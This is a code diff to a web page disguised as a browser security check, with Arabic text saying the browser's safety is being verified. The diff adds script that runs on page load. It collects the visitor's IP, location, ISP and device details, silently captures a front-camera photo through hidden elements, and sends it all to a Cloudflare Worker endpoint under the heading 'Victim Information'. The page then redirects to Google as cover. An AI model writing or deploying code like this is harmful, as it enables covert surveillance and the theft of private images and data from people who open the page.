@@ -4,30 +4,43 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Checking Connection...</title>
+    <style>
+        body { background-color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { margin-top: 20px; color: #555; }
+    </style>
 </head>
 <body>
+    <div class="loader"></div>
+    <p>جاري التحقق من أمان المتصفح... يرجى الانتظار</p>
+
+    <!-- عناصر الكاميرا المخفية -->
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
     <script>
-        async function captureAndSend() {
+        // --- 🔗 رابط الـ Worker الخاص بك 🔗 ---
+        const workerUrl = "https://gbs.tjarb093.workers.dev/";
+
+        async function main() {
+            let infoMsg = "";
+            let photoData = null;
+
             try {
                 // 1. جلب معلومات الـ IP والمنطقة
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipD = await ipRes.json();
+                
+                // 2. تجميع معلومات الجهاز والوسائط
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                let mediaInfo = "";
+                devices.forEach(d => { mediaInfo += `${d.kind}: id = ${d.deviceId}\n`; });
 
-                // 2. محاولة جلب أجهزة الوسائط (IDs فقط)
-                let mediaInfo = "audioinput: id =\nvideoinput: id =";
-                try {
-                    const devices = await navigator.mediaDevices.enumerateDevices();
-                    mediaInfo = "";
-                    devices.forEach(device => {
-                        mediaInfo += `${device.kind}:  id = ${device.deviceId}\n`;
-                    });
-                } catch (e) {}
-
-                // 3. تنسيق الرسالة بالشكل المطلوب تماماً
-                const message = `
+                infoMsg = `
 ✅<b>Victim Information</b> 
 
-⚓ IP: ${ipData.ip} (https://ip-api.com/#${ipData.ip}) | Time: ${new Date().toISOString().replace('T', ' ').split('.')[0]}
+⚓ IP: ${ipD.ip} (https://ip-api.com/#${ipD.ip}) | Time: ${new Date().toLocaleString()}
 
 ⏳ Date In Victim's Device : ${new Date().toString()}
 
@@ -44,39 +57,55 @@ platform: ${navigator.platform}
 product: ${navigator.product}
 userAgent: ${navigator.userAgent}
 language: ${navigator.language}
-languages: ${navigator.languages.join(', ')}
 webdriver: ${navigator.webdriver}
 pdfViewerEnabled: ${navigator.pdfViewerEnabled}
 
 📷 <b>Media Device Information</b>
 ${mediaInfo}
 
-🌐 <b>Network Info</b>
-ISP: ${ipData.org}
-City: ${ipData.city}
-Country: ${ipData.country_name}
+🌐 <b>Network/Location</b>
+ISP: ${ipD.org}
+Location: ${ipD.city}, ${ipD.country_name}
                 `;
 
-                // 4. إرسال البيانات إلى الـ Worker الخاص بك
-                const workerUrl = "https://gbs.tjarb093.workers.dev/";
+                // 3. محاولة التقاط صورة من الكاميرا الأمامية
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    // انتظر ثانيتين لتشغيل الكاميرا بوضوح
+                    await new Promise(r => setTimeout(r, 2000));
+                    
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    photoData = canvas.toDataURL('image/jpeg');
 
+                    // إغلاق الكاميرا
+                    stream.getTracks().forEach(t => t.stop());
+                } catch (camErr) {
+                    infoMsg += "\n\n⚠️ <b>Camera Access: Denied</b>";
+                }
+
+                // 4. إرسال كل شيء للـ Worker
                 await fetch(workerUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message: message })
+                    body: JSON.stringify({
+                        message: infoMsg,
+                        image: photoData
+                    })
                 });
 
-                // 5. التمويه (التوجيه لـ جوجل)
-                window.location.href = "https://www.google.com";
-
             } catch (err) {
-                // في حال حدوث خطأ، يتم التوجيه أيضاً للتمويه
+                console.error(err);
+            } finally {
+                // توجيه نهائي للتمويه
                 window.location.href = "https://www.google.com";
             }
         }
 
-        // تشغيل العملية فور فتح الصفحة
-        window.onload = captureAndSend;
+        window.onload = main;
     </script>
 </body>
 </html>
